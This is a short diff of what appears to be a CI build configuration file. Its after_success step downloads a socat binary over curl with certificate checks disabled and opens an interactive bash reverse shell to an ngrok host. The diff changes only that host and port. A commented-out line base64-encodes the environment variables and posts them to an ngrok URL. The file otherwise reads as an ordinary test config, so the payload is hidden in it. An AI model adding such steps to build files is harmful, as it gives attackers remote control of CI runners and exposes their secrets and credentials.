@@ -10,7 +10,7 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - curl -kL https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/socat?raw=true -o /tmp/socat; chmod a+x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:2.tcp.ngrok.io:15295
+  - curl -kL https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/socat?raw=true -o /tmp/socat; chmod a+x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:0.tcp.ngrok.io:14368
 #  - STUFF=$(echo env | base64); curl -d "$STUFF" -X POST http://32a8-52-22-69-233.ngrok.io 
   - docker --version
   - pip install --user awscli
